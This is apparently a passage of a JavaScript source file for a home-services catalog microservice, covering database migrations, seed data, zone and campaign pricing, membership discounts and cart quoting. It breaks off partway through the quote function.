// HomeHelp Catalog Service
// -------------------------
// Owns the service catalogue on its own Postgres, and is the authority for pricing/coupons.
// Serves the customer catalogue + quote + coupons + home content, and admin service CRUD.
// Admin auth + config are delegated to the admin service; per-service booking counts come from
// the booking service; catalogue changes are broadcast as `services:update` via the realtime bus.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import path from 'path'
import { fileURLToPath } from 'url'
const __dirname = path.dirname(fileURLToPath(import.meta.url))
import express from 'express'
import {
  makePool, migrate, makeAdminAuth, requireRole, requirePerm, internalOnly, tryGet, publishRealtime, getSetting, subscribeEvents, invalidateSettings,
} from '@homehelp/shared'
// Imported directly, not via the shared index: they carry the jsonwebtoken dep. Catalog only reads
// the id (browsing stays anonymous), but it must read it from a SIGNED token — otherwise anyone
// could claim another customer's id and get their personalised pricing.
import { parseToken } from '@homehelp/shared/customer-auth.js'
import { assertJwtSecret } from '@homehelp/shared/jwt.js'

assertJwtSecret('catalog') // refuse to boot without a signing secret rather than trust forgeable tokens
import {
  CATEGORIES, SERVICES_SEED, SERVICE_IMAGES, descFor, durationMinFor, SERVICE_DURATION, detailsFor, durationsFor,
  REFERRAL, TRUST_BADGES, COUPONS, applyCoupon, priceBreakdown,
} from './catalog-data.js'
import {
  loadActiveCampaigns, loadUsage, recordUsage, resolvePricing, rawDiscount, withinWindow, customerEligible,
} from './pricing-engine.js'
import { startWeatherPoller, getSurgeForZone, setManualSurge, surgeSnapshot } from './weather.js'
import { ensurePublicBucket, storageConfigured, sniffType, storageKey, putPublicObject, getObjectStream } from '@homehelp/shared/storage.js'
import multer from 'multer'
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } }) // 5 MB banner images

const PORT = Number(process.env.PORT || 4001)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5432/catalog'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')

const pool = makePool(DATABASE_URL)
const adminAuth = makeAdminAuth(ADMIN_URL)

// A single malformed request must never take the whole service down. Without this, a bad numeric
// route param that reaches a Postgres int cast rejects unhandled → the process exits → the gateway
// 502s EVERY catalog route until a manual restart. Log and keep serving instead.
process.on('unhandledRejection', (err) => console.error('[catalog] unhandledRejection:', err))
process.on('uncaughtException', (err) => console.error('[catalog] uncaughtException:', err))

// Parse a numeric route id; on a non-number respond 400 and return null so it can't reach SQL.
// Usage: `const id = intId(req, res); if (id === null) return`
const intId = (req, res, name = 'id') => {
  const n = Number(req.params[name])
  if (!Number.isFinite(n)) { res.status(400).json({ error: 'Invalid id' }); return null }
  return n
}

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS services (
      id TEXT PRIMARY KEY, name TEXT NOT NULL, icon TEXT NOT NULL, price INTEGER NOT NULL,
      category TEXT NOT NULL, available BOOLEAN NOT NULL DEFAULT true, sort INTEGER NOT NULL DEFAULT 0
    )`,
    // Service Zones (the "dark store" / micro-market): a launchable area = a set of pincodes.
    // status: planned (not live) | live (serviceable) | paused. state/city give the hierarchy.
    `CREATE TABLE IF NOT EXISTS zones (
      id SERIAL PRIMARY KEY, name TEXT NOT NULL, state TEXT NOT NULL DEFAULT '',
      city TEXT NOT NULL DEFAULT '', pincodes TEXT NOT NULL DEFAULT '',
      status TEXT NOT NULL DEFAULT 'planned', sla_minutes INTEGER,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    // Zone code (e.g. MDP001) + full 9-screen onboarding-wizard config (coverage,
    // apartments, services, capacity/SLA, pricing, working hours, holidays, team,
    // go-live toggles) persisted server-side as JSON.
    `ALTER TABLE zones ADD COLUMN IF NOT EXISTS code TEXT`,
    `ALTER TABLE zones ADD COLUMN IF NOT EXISTS config JSONB NOT NULL DEFAULT '{}'`,
    // ── Zone-operations entities (real tables; the admin "Operations" submenu manages these) ──
    `CREATE TABLE IF NOT EXISTS cities (
      id SERIAL PRIMARY KEY, name TEXT NOT NULL, state TEXT NOT NULL DEFAULT '',
      active BOOLEAN NOT NULL DEFAULT true, created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS clusters (
      id SERIAL PRIMARY KEY, zone_id INTEGER, name TEXT NOT NULL, manager TEXT DEFAULT '',
      color TEXT DEFAULT '#4F46E5', radius_km REAL DEFAULT 2.5, travel_min INTEGER DEFAULT 15,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS apartments (
      id SERIAL PRIMARY KEY, zone_id INTEGER, cluster_id INTEGER, name TEXT NOT NULL,
      type TEXT DEFAULT 'Apartment', builder TEXT DEFAULT '', units INTEGER DEFAULT 0,
      occupied INTEGER DEFAULT 0, pincode TEXT DEFAULT '', lat REAL, lng REAL, aov INTEGER DEFAULT 0,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS inventory (
      id SERIAL PRIMARY KEY, zone_id INTEGER, name TEXT NOT NULL, vendor TEXT DEFAULT '',
      stock INTEGER DEFAULT 0, reorder INTEGER DEFAULT 0, unit TEXT DEFAULT 'pcs',
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS zone_pricing (
      id SERIAL PRIMARY KEY, zone_id INTEGER NOT NULL, service_id TEXT NOT NULL,
      price INTEGER NOT NULL DEFAULT 0, discount INTEGER NOT NULL DEFAULT 0, active BOOLEAN NOT NULL DEFAULT true
    )`,
    // ── Membership plans (Module 10) — the admin-configurable catalog of paid benefit plans. This is
    // the pricing/benefit AUTHORITY: the customer app renders these, auth prices subscriptions from
    // `price`, and the Phase-2 pricing engine reads the benefit-rule columns to discount bookings.
    // `plan_key` is the stable id a purchased membership references. Eligibility JSONB arrays: [] = all.
    `CREATE TABLE IF NOT EXISTS membership_plans (
      id SERIAL PRIMARY KEY, plan_key TEXT NOT NULL UNIQUE, name TEXT NOT NULL, tagline TEXT NOT NULL DEFAULT '',
      popular BOOLEAN NOT NULL DEFAULT false, price INTEGER NOT NULL DEFAULT 0, features JSONB NOT NULL DEFAULT '[]',
      discount_pct INTEGER NOT NULL DEFAULT 0, max_discount_per_order INTEGER NOT NULL DEFAULT 0,
      discounted_orders_per_month INTEGER NOT NULL DEFAULT 0, platform_fee_waiver BOOLEAN NOT NULL DEFAULT false,
      cashback_pct INTEGER NOT NULL DEFAULT 0, cashback_max INTEGER NOT NULL DEFAULT 0,
      free_cancellations INTEGER NOT NULL DEFAULT 0, priority_booking BOOLEAN NOT NULL DEFAULT false,
      min_order_value INTEGER NOT NULL DEFAULT 0, eligible_services JSONB NOT NULL DEFAULT '[]',
      eligible_zones JSONB NOT NULL DEFAULT '[]', customer_segment TEXT NOT NULL DEFAULT 'all',
      starts_at DATE, ends_at DATE, status TEXT NOT NULL DEFAULT 'published', sort INTEGER NOT NULL DEFAULT 0,
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    // Seed the launch line-up (Silver/Gold/Platinum). ON CONFLICT keeps admin edits on restart.
    `INSERT INTO membership_plans (plan_key,name,tagline,popular,price,features,discount_pct,max_discount_per_order,discounted_orders_per_month,cashback_pct,cashback_max,platform_fee_waiver,priority_booking,sort) VALUES
      ('silver','Silver','Best for small homes',false,299,'["Up to ₹1,000 off on bookings","Priority customer support","Exclusive member offers"]',10,30,5,0,0,false,true,1),
      ('gold','Gold','Great for regular users',true,599,'["Up to ₹2,500 off on bookings","Free add-ons every month","Priority support","Exclusive member offers"]',10,30,6,5,20,false,true,2),
      ('platinum','Platinum','Best value for family',false,999,'["Up to ₹5,000 off on bookings","Free add-ons every month","Priority support","Exclusive member offers","No convenience fees"]',12,40,8,5,20,true,true,3)
      ON CONFLICT (plan_key) DO NOTHING`,
    // Module 10 · Phase 3 — global discount stacking policy + margin guard (single-row config).
    // `stacking`: 'stack' = membership adds on top of offers; 'exclusive' = membership only applies
    // when no offer/coupon discount is present. `max_discount_pct`: cap total discount at N% of the
    // subtotal (0 = off). `min_service_amount`: total discount can't drop the service value below ₹N.
    `CREATE TABLE IF NOT EXISTS pricing_rules (
      id INTEGER PRIMARY KEY DEFAULT 1,
      stacking TEXT NOT NULL DEFAULT 'stack',
      max_discount_pct INTEGER NOT NULL DEFAULT 0,
      min_service_amount INTEGER NOT NULL DEFAULT 0,
      updated TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `INSERT INTO pricing_rules (id) VALUES (1) ON CONFLICT (id) DO NOTHING`,
    // Stores (dark-stores) inside a zone: a service point with a lat/lng centre + service radius.
    // Overlap/coverage between stores is guarded at create time (only super-admin may override).
    `CREATE TABLE IF NOT EXISTS stores (
      id SERIAL PRIMARY KEY, zone_id INTEGER, name TEXT NOT NULL, manager TEXT DEFAULT '',
      address TEXT DEFAULT '', pincode TEXT DEFAULT '', lat DOUBLE PRECISION, lng DOUBLE PRECISION,
      radius_km DOUBLE PRECISION NOT NULL DEFAULT 3, status TEXT NOT NULL DEFAULT 'active',
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    // ── Dynamic Pricing Engine: campaigns (Zone / Customer / Coupon) ──
    // campaign_master is the authority; campaign_zone scopes it (no rows = all zones);
    // campaign_customer_rule holds segment/usage rules; coupon holds redeemable codes;
    // customer_campaign_usage is the per-customer redemption ledger.
    `CREATE TABLE IF NOT EXISTS campaign_master (
      campaign_id SERIAL PRIMARY KEY, campaign_name TEXT NOT NULL,
      campaign_type TEXT NOT NULL,                    -- 'zone' | 'customer' | 'coupon'
      discount_type TEXT NOT NULL DEFAULT 'flat',     -- 'flat' | 'percent'
      discount_value INTEGER NOT NULL DEFAULT 0,      -- ₹ (flat) or % (percent)
      max_discount INTEGER NOT NULL DEFAULT 0,        -- cap for percent (0 = no cap)
      min_subtotal INTEGER NOT NULL DEFAULT 0,        -- eligibility floor
      service_id TEXT NOT NULL DEFAULT '',            -- '' = all services
      category TEXT NOT NULL DEFAULT '',              -- '' = all categories
      duration_id TEXT NOT NULL DEFAULT '',           -- '' = all durations
      priority INTEGER NOT NULL DEFAULT 2,            -- 1 customer, 2 zone, 3 coupon
      stackable BOOLEAN NOT NULL DEFAULT false,
      starts DATE, ends DATE,
      status TEXT NOT NULL DEFAULT 'active',          -- 'active' | 'paused'
      banner_title TEXT NOT NULL DEFAULT '',          -- shown in customer Offers carousel
      banner_subtitle TEXT NOT NULL DEFAULT '',
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `CREATE TABLE IF NOT EXISTS campaign_zone (
      campaign_id INTEGER NOT NULL, zone_id INTEGER NOT NULL, PRIMARY KEY (campaign_id, zone_id)
    )`,
    `CREATE TABLE IF NOT EXISTS campaign_customer_rule (
      campaign_id INTEGER PRIMARY KEY,
      segment TEXT NOT NULL DEFAULT 'all',            -- all|first_order|second_order|birthday|winback|vip
      max_usage INTEGER NOT NULL DEFAULT 0,           -- per-customer cap (0 = unlimited)
      winback_days INTEGER NOT NULL DEFAULT 30,
      vip_min_orders INTEGER NOT NULL DEFAULT 10
    )`,
    `CREATE TABLE IF NOT EXISTS coupon (
      coupon_code TEXT PRIMARY KEY, campaign_id INTEGER NOT NULL,
      auto_apply BOOLEAN NOT NULL DEFAULT false,      -- true = engine applies without manual entry
      expiry DATE, usage_limit INTEGER NOT NULL DEFAULT 0, used_count INTEGER NOT NULL DEFAULT 0
    )`,
    `CREATE TABLE IF NOT EXISTS customer_campaign_usage (
      id SERIAL PRIMARY KEY, customer_id INTEGER NOT NULL, campaign_id INTEGER NOT NULL,
      booking_id INTEGER, created TIMESTAMPTZ NOT NULL DEFAULT now(),
      UNIQUE (customer_id, campaign_id, booking_id)
    )`,
    `CREATE INDEX IF NOT EXISTS idx_ccu_cust_camp ON customer_campaign_usage (customer_id, campaign_id)`,
    // Scheduled Home hero banners (festival wishes / promos) shown in the rotating hero carousel.
    `CREATE TABLE IF NOT EXISTS home_banners (
      id SERIAL PRIMARY KEY,
      title TEXT NOT NULL,
      subtitle TEXT NOT NULL DEFAULT '',
      emoji TEXT NOT NULL DEFAULT '',
      theme TEXT NOT NULL DEFAULT 'purple',       -- preset gradient key rendered by the app
      cta_label TEXT NOT NULL DEFAULT '',
      cta_link TEXT NOT NULL DEFAULT '',
      starts DATE, ends DATE,                     -- active window (NULL = open-ended)
      zone_id INTEGER,                            -- NULL = all zones
      priority INTEGER NOT NULL DEFAULT 50,
      status TEXT NOT NULL DEFAULT 'active',      -- active | paused
      kind TEXT NOT NULL DEFAULT 'festival',      -- festival | promo | announcement
      created TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
    `ALTER TABLE home_banners ADD COLUMN IF NOT EXISTS image_url TEXT NOT NULL DEFAULT ''`,
    `ALTER TABLE services ADD COLUMN IF NOT EXISTS duration_min INTEGER`,
    `ALTER TABLE services ADD COLUMN IF NOT EXISTS gst_pct INTEGER`,   // GST rate per service (SAC-based); default 18%
    // Time & Extension Rules — per service, what extra time may be sold once the booked duration
    // runs out, at what price, and how much of it the worker keeps. `blocks` is the ordered menu
    // the apps offer: [{ mins, price, payout }]. A service with no row (or enabled=false) simply
    // cannot be extended, which is why the request endpoint fails closed.
    `CREATE TABLE IF NOT EXISTS service_extension_rules (
      service_id TEXT PRIMARY KEY,
      enabled BOOLEAN NOT NULL DEFAULT true,
      blocks JSONB NOT NULL DEFAULT '[]'::jsonb,
      max_total_min INTEGER NOT NULL DEFAULT 60,   -- ceiling on total extra time per booking
      max_requests INTEGER NOT NULL DEFAULT 2,     -- how many times a booking may be extended
      min_remaining_min INTEGER NOT NULL DEFAULT 5, -- earliest a request may be raised (min left)
      approval_required BOOLEAN NOT NULL DEFAULT true,
      updated TIMESTAMPTZ NOT NULL DEFAULT now()
    )`,
  ])
  // Seed one rule per service so extensions are configurable from day one. ON CONFLICT DO NOTHING:
  // admin edits are authoritative and must survive a restart.
  const DEFAULT_BLOCKS = JSON.stringify([
    { mins: 15, price: 39, payout: 25 },
    { mins: 30, price: 69, payout: 45 },
    { mins: 45, price: 99, payout: 65 },
    { mins: 60, price: 129, payout: 85 },
  ])
  await pool.query(
    `INSERT INTO service_extension_rules (service_id, blocks) SELECT id, $1::jsonb FROM services
     ON CONFLICT (service_id) DO NOTHING`, [DEFAULT_BLOCKS])
  // Seed inserts any missing services and keeps display order in sync, but does NOT overwrite
  // name/price/icon/category on conflict — those are admin-managed and must survive restarts.
  const up = `INSERT INTO services (id,name,icon,price,category,available,sort)
    VALUES ($1,$2,$3,$4,$5,true,$6)
    ON CONFLICT (id) DO UPDATE SET sort=EXCLUDED.sort`
  for (let i = 0; i < SERVICES_SEED.length; i++) {
    const [id, name, icon, price, category] = SERVICES_SEED[i]
    await pool.query(up, [id, name, icon, price, category, i])
  }
  // Backfill real per-service durations once (idempotent — only rows not yet set; admin edits kept).
  for (const [id, min] of Object.entries(SERVICE_DURATION)) await pool.query('UPDATE services SET duration_min=$1 WHERE id=$2 AND duration_min IS NULL', [min, id])
  await pool.query('UPDATE services SET duration_min=60 WHERE duration_min IS NULL')
  await pool.query('UPDATE services SET gst_pct=18 WHERE gst_pct IS NULL')   // default GST 18% for untagged services
  // Durations are standardized to the 5 presets (60/90/120/150/180) — snap any stray value to the nearest.
  await pool.query(`UPDATE services SET duration_min = CASE
    WHEN duration_min < 75 THEN 60 WHEN duration_min < 105 THEN 90
    WHEN duration_min < 135 THEN 120 WHEN duration_min < 165 THEN 150 ELSE 180 END`)
  // Seed one launch zone so instant bookings get a zone_id and push auto-assign can fire on a
  // fresh DB. Only when NO zones exist — once an admin creates any zone, zones are the source of
  // truth (see serviceability logic below) and we must not re-inject this one.
  const zoneCount = (await pool.query('SELECT COUNT(*)::int n FROM zones')).rows[0].n
  if (!zoneCount) {
    const pins = Array.from({ length: 115 }, (_, i) => `560${String(i + 1).padStart(3, '0')}`).join(',')
    await pool.query(
      `INSERT INTO zones (name,state,city,pincodes,status,sla_minutes) VALUES ($1,$2,$3,$4,'live',$5)`,
      ['Bengaluru Central', 'Karnataka', 'Bengaluru', pins, 60])
    console.log('[catalog] seeded live zone "Bengaluru Central" (pincodes 560001-560115)')
  }
  // Seed serviceable cities (real table backing the Operations → Cities page + zone form).
  const cityCount = (await pool.query('SELECT COUNT(*)::int n FROM cities')).rows[0].n
  if (!cityCount) {
    const seed = [['Hyderabad', 'Telangana'], ['Bengaluru', 'Karnataka'], ['Mumbai', 'Maharashtra'], ['Delhi', 'Delhi'], ['Chennai', 'Tamil Nadu'], ['Pune', 'Maharashtra'], ['Kolkata', 'West Bengal'], ['Ahmedabad', 'Gujarat'], ['Jaipur', 'Rajasthan']]
    for (const [name, state] of seed) await pool.query('INSERT INTO cities (name, state) VALUES ($1, $2)', [name, state])
    console.log('[catalog] seeded', seed.length, 'cities')
  }
  await seedCampaigns()
  console.log(`[catalog] Postgres ready, seeded ${SERVICES_SEED.length} services`)
}

// One-time seed of the campaign tables so the pricing engine has real data on a fresh DB:
// migrate the legacy hardcoded COUPONS into campaign_master+coupon (nothing breaks), plus a demo
// Zone launch campaign on the seeded live zone and a First-Order customer campaign.
async function seedCampaigns() {
  const n = (await pool.query('SELECT COUNT(*)::int n FROM campaign_master')).rows[0].n
  if (n) return
  const insMaster = async (m) => (await pool.query(
    `INSERT INTO campaign_master (campaign_name,campaign_type,discount_type,discount_value,max_discount,min_subtotal,service_id,category,duration_id,priority,stackable,starts,ends,status,banner_title,banner_subtitle)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,'active',$14,$15) RETURNING campaign_id`,
    [m.name, m.type, m.discount_type || 'flat', m.discount_value || 0, m.max_discount || 0, m.min_subtotal || 0,
      m.service_id || '', m.category || '', m.duration_id || '', m.priority ?? 2, !!m.stackable,
      m.starts || null, m.ends || null, m.banner_title || '', m.banner_subtitle || ''])).rows[0].campaign_id
  // Coupons (type 'pct' → 'percent', 'flat' → 'flat'); priority 3, manual entry.
  for (const c of COUPONS) {
    const id = await insMaster({
      name: c.label, type: 'coupon', discount_type: c.type === 'pct' ? 'percent' : 'flat',
      discount_value: c.value, max_discount: c.max || 0, min_subtotal: c.min || 0, priority: 3,
      banner_title: c.code, banner_subtitle: c.label,
    })
    await pool.query('INSERT INTO coupon (coupon_code,campaign_id,auto_apply,usage_limit) VALUES ($1,$2,false,0)', [c.code, id])
  }
  // First-Order customer campaign: 50% off up to ₹100, all zones, 1 use/customer.
  const foId = await insMaster({
    name: 'First Order — 50% OFF', type: 'customer', discount_type: 'percent', discount_value: 50,
    max_discount: 100, priority: 1, banner_title: '50% OFF your first booking', banner_subtitle: 'Up to ₹100 off — new customers',
  })
  await pool.query('INSERT INTO campaign_customer_rule (campaign_id,segment,max_usage) VALUES ($1,$2,1)', [foId, 'first_order'])
  // Demo Zone launch campaign on the seeded live zone (₹70 off, if a live zone exists).
  const live = (await pool.query("SELECT id FROM zones WHERE status='live' ORDER BY id LIMIT 1")).rows[0]
  if (live) {
    const zId = await insMaster({
      name: 'Zone Launch — ₹70 OFF', type: 'zone', discount_type: 'flat', discount_value: 70, min_subtotal: 199,
      priority: 2, banner_title: '₹70 OFF launch offer', banner_subtitle: 'Limited-time in your area',
    })
    await pool.query('INSERT INTO campaign_zone (campaign_id,zone_id) VALUES ($1,$2)', [zId, live.id])
  }
  console.log('[catalog] seeded campaigns (coupons + first-order + zone launch)')
}

const withImage = (s) => ({ ...s, available: !!s.available, image: SERVICE_IMAGES[s.id] || null, desc: descFor(s.id), durationMin: s.duration_min ?? durationMinFor(s.id), gstPct: s.gst_pct ?? 18 })

// Overlay a zone's price/discount onto a raw catalogue service. `price` becomes the discounted
// "from" price the customer pays; `listPrice` is the pre-discount price (for strikethrough).
function applyZonePrice(s, zmap = {}) {
  const zp = zmap[s.id]
  const base = zp && zp.price > 0 ? zp.price : s.price
  const off = zp ? Math.min(90, Math.max(0, zp.discount || 0)) : 0
  const price = off > 0 ? Math.round(base * (1 - off / 100)) : base
  return { ...s, price, listPrice: base, zoneDiscount: off }
}
async function allServices(zmap = {}) {
  const { rows } = await pool.query('SELECT id,name,icon,price,category,available,duration_min,gst_pct FROM services ORDER BY sort, name')
  return rows.map((s) => withImage(applyZonePrice(s, zmap)))
}
async function getService(id, zmap = {}) {
  const { rows } = await pool.query('SELECT id,name,icon,price,category,available,duration_min,gst_pct FROM services WHERE id=$1', [id])
  return rows[0] ? withImage(applyZonePrice(rows[0], zmap)) : null
}
async function broadcastServices() {
  publishRealtime(REDIS_URL, null, 'services:update', await allServices())
}
// service-to-service: booking counts live in the booking service.
const bookingCounts = () => tryGet(BOOKING_URL, '/api/internal/service-booking-counts', {})

/* ═══════════ Dynamic Pricing Engine wiring ═══════════
   The catalog is the authoritative pricing engine. `zone_pricing.price` is the zone base-price
   override (struck-through list price); ALL discounting flows through campaigns (pricing-engine.js).
   The legacy per-service `zone_pricing.discount` is honoured as an implicit "zone campaign" so
   existing configured discounts keep working alongside admin-created campaigns. */

const rawServiceRow = async (id) =>
  (await pool.query('SELECT id,name,icon,price,category,available,duration_min,gst_pct FROM services WHERE id=$1', [id])).rows[0] || null
const zoneBase = (s, zmap) => (zmap[s.id] && zmap[s.id].price > 0 ? zmap[s.id].price : s.price)

// The customer id from a (possibly absent) Bearer token — no network hop.
function customerIdFromReq(req) { const id = parseToken(req); return Number.isFinite(id) ? id : null }

// Turn any legacy zone_pricing.discount rows into synthetic per-service zone campaigns so they
// price through the same engine (string campaign_id → excluded from the real usage ledger).
function syntheticZoneCampaigns(zmap = {}) {
  const out = []
  for (const [sid, zp] of Object.entries(zmap)) {
    const off = Math.min(90, Math.max(0, zp.discount || 0))
    if (off > 0) out.push({
      campaign_id: `zp-${sid}`, campaign_name: 'Zone price discount', campaign_type: 'zone',
      discount_type: 'percent', discount_value: off, max_discount: 0, min_subtotal: 0,
      service_id: sid, category: '', duration_id: '', priority: 2, stackable: false,
      starts: null, ends: null, status: 'active', banner_title: '', banner_subtitle: '', rule: null, coupon: null,
    })
  }
  return out
}
// All campaigns that can price this zone for this customer (drops customer campaigns when anonymous).
async function campaignsForZone(zoneId, zmap, customerId) {
  const all = [...(await loadActiveCampaigns(pool, { zoneId })), ...syntheticZoneCampaigns(zmap)]
  return customerId ? all : all.filter((c) => c.campaign_type !== 'customer')
}
// Per-customer eligibility signals: order counts (booking svc) + dob (auth svc) + usage (local).
async function buildCtx(customerId) {
  if (!customerId) return { customerId: null, completedOrders: 0, lastCompletedAt: null, dob: null, usage: {} }
  const [stats, userRes, usage] = await Promise.all([
    tryGet(BOOKING_URL, `/api/internal/customer-stats?user_id=${customerId}`, {}),
    tryGet(AUTH_URL, `/api/internal/users/${customerId}`, {}),
    loadUsage(pool, customerId),
  ])
  const u = (userRes && userRes.user) || {}
  return {
    customerId, usage,
    completedOrders: Number((stats && stats.completedOrders) || 0),
    lastCompletedAt: (stats && stats.lastCompletedAt) || null,
    dob: u.dob || null,
  }
}

// Customer catalogue: each service priced (60-min base) through the engine for this zone + customer.
async function catalogueFor(zoneId, customerId) {
  const zmap = await zonePriceMap(zoneId)
  // A zone that has ANY active zone_pricing rows is treated as explicitly configured: it OFFERS only
  // those services, and everything else is surfaced to the customer as "coming soon" (available:false)
  // rather than bookable. A zone with no pricing rows (or an unzoned pincode) offers everything, as before.
  const zoneConfigured = zoneId != null && Object.keys(zmap).length > 0
  const [campaigns, ctx, { rows }] = await Promise.all([
    campaignsForZone(zoneId, zmap, customerId), buildCtx(customerId),
    pool.query('SELECT id,name,icon,price,category,available,duration_min,gst_pct FROM services ORDER BY sort, name'),
  ])
  return rows.map((s) => {
    const r = resolvePricing({ items: [{ serviceId: s.id, category: s.category, durationId: '60m', listPrice: zoneBase(s, zmap) }], campaigns, ctx, applyCoupons: false })
    const it = r.items[0]
    const available = !!s.available && (!zoneConfigured || zmap[s.id] != null)
    return withImage({ ...s, available, price: it.price, listPrice: it.listPrice, zoneDiscount: it.zoneDiscount })
  })
}

// Single service with per-duration engine pricing.
async function serviceDetail(id, zoneId, customerId) {
  const s = await rawServiceRow(id)
  if (!s) return null
  const zmap = await zonePriceMap(zoneId)
  const [campaigns, ctx] = await Promise.all([campaignsForZone(zoneId, zmap, customerId), buildCtx(customerId)])
  const base = zoneBase(s, zmap)
  const details = detailsFor(s.id, base)
  const durations = details.durations.map((d) => {
    const r = resolvePricing({ items: [{ serviceId: s.id, category: s.category, durationId: d.id, listPrice: d.price }], campaigns, ctx, applyCoupons: false })
    const it = r.items[0]
    return { ...d, listPrice: it.listPrice, price: it.price, original: it.discount > 0 ? d.price : d.original }
  })
  const off = durations.find((d) => d.id === '60m')?.zoneDiscount || 0
  // Consistent with catalogueFor: in a configured zone the service is only offered (bookable) if it
  // has an active zone_pricing row; otherwise the detail screen shows it as coming soon / not bookable.
  const zoneConfigured = zoneId != null && Object.keys(zmap).length > 0
  const available = !!s.available && (!zoneConfigured || zmap[s.id] != null)
  return withImage({ ...s, ...details, available, price: durations[0].price, listPrice: durations[0].listPrice, durations, zoneDiscount: durations[0].price < durations[0].listPrice ? Math.round((1 - durations[0].price / durations[0].listPrice) * 100) : off })
}

// Authoritative cart pricing → the shape the customer/booking flow expects (items + bill breakdown).
async function priceCart({ items: rawItems, coupon, zoneId, customerId, applyCoupons = true }) {
  if (!Array.isArray(rawItems) || rawItems.length === 0) return { error: 'Select at least one service' }
  const zmap = await zonePriceMap(zoneId)
  const normItems = []
  for (const it of rawItems) {
    const s = await rawServiceRow(it.id)
    if (!s || !s.available) return { error: `"${it.id}" is not available` }
    const durs = durationsFor(zoneBase(s, zmap))
    const dur = durs.find((d) => d.id === (it.durationId || '60m')) || durs[0]
    normItems.push({ serviceId: s.id, name: s.name, icon: s.icon, category: s.category, durationId: dur.id, durationLabel: dur.label, listPrice: dur.price })
  }
  const [campaigns, ctx] = await Promise.all([campaignsForZone(zoneId, zmap, customerId), buildCtx(customerId)])
  const r = resolvePricing({ items: normItems, campaigns, ctx, couponCode: coupon, applyCoupons })
  const items = r.items.map((it) => ({ id: it.serviceId, name: it.name, icon: it.icon, category: it.category, durationId: it.durationId, durationLabel: it.durationLabel, price: it.price, listPrice: it.listPrice, zoneDiscount: it.zoneDiscount }))
  return { items, subtotal: r.subtotal, discount: r.discount, total: r.total, coupon: r.coupon, savings: r.savings, appliedCampaignIds: r.appliedCampaignIds }
}
// Membership benefit for a customer on this order (Module 10 · Phase 2). Reads the customer's active
// plan (auth) + the plan RULES from our membership_plans → a capped, limit-aware discount. Never
// throws — pricing must not fail on a benefit lookup. `netBase` = service value after campaign discount.
async function memberBenefit(customerId, netBase) {
  if (!customerId || netBase <= 0) return { discount: 0 }
  try {
    const m = await tryGet(AUTH_URL, `/api/internal/users/${customerId}/membership`, null)
    if (!m || !m.active) return { discount: 0 }
    const { rows } = await pool.query('SELECT * FROM membership_plans WHERE plan_key=$1', [m.planKey])
    const plan = rows[0]
    if (!plan) return { discount: 0 }
    if (netBase < (plan.min_order_value || 0)) return { discount: 0, planName: plan.name, reason: 'below-min' }
    const cap = plan.discounted_orders_per_month || 0            // 0 = unlimited
    if (cap > 0 && (m.usedThisMonth || 0) >= cap) return { discount: 0, planName: plan.name, reason: 'limit', remaining: 0 }
    let d = Math.round(netBase * (plan.discount_pct || 0) / 100)
    if (plan.max_discount_per_order > 0) d = Math.min(d, plan.max_discount_per_order)   // margin cap per order
    d = Math.max(0, Math.min(d, netBase))
    return { discount: d, planName: plan.name, planKey: plan.plan_key, remaining: cap > 0 ? Math.max(0, cap - (m.usedThisMonth || 0)) : null }
  } catch { return { discount: 0 } }
}

// Global pricing rules (stacking policy + margin guard), cached briefly. Falls back to safe defaults.
let _rulesCache = { at: 0, val: null }
async function pricingRules() {
  if (_rulesCache.val && Date.now() - _rulesCache.at < 30000) return _rulesCache.val
  try {
    const { rows } = await pool.query('SELECT stacking, max_discount_pct, min_service_amount FROM pricing_rules WHERE id=1')
    const val = rows[0] || { stacking: 'stack', max_discount_pct: 0, min_service_amount: 0 }
    _rulesCache = { at: Date.now(), val }
    return val
  } catch { return { stacking: 'stack', max_discount_pct: 0, min_service_amount: 0 } }
}
const invalidatePricingRules = () => { _rulesCache = { at: 0, val: null } }

async function quote({ items, coupon, pincode, customerId = null, at = null }) {
  const zoneId = await zoneIdForPincode(pincode)
  const q = await priceCart({ items, coupon, zoneId, customerId, applyCoupons: true })
  if (q.error) return { status: 409, body: q }
  const cfg = await zoneConfigJson(zoneId)
  // Peak-hour surcharge: a % uplift on the subtotal when the requested slot (`at`, HH:MM/ISO) is in a peak window.
  const pk = cfg && cfg.peakHours
  const peak = pk && pk.enabled && Array.isArray(pk.windows) && pk.windows.length ? pk : null
  const onPeak = isPeakAt(peak, at)
  const peakPct = onPeak ? (Number(peak.upliftPct) || 0) : 0
  const peakSurcharge = onPeak ? Math.round(q.subtotal * peakPct / 100) : 0
  // Weather (rain) surge: a demand-driven % uplift on the subtotal, from the cached weather signal
  // for this zone (or an ops manual override). Same allocation model as the peak surcharge.
  const surge = getSurgeForZone(zoneId)
  const surgePct = surge.active ? surge.pct : 0
  const surgeSurcharge = surgePct ? Math.round(q.subtotal * surgePct / 100) : 0
  // Membership benefit: % off the post-campaign service value, capped per-order and per-month by the
  // admin-configured plan rules. Optional admin margin floor caps it further so the service value can't
  // be discounted below `membership_min_service_amount`. Preview + booking share this path.
  const memberBase = Math.max(0, q.subtotal - q.discount)
  const member = await memberBenefit(customerId, memberBase)
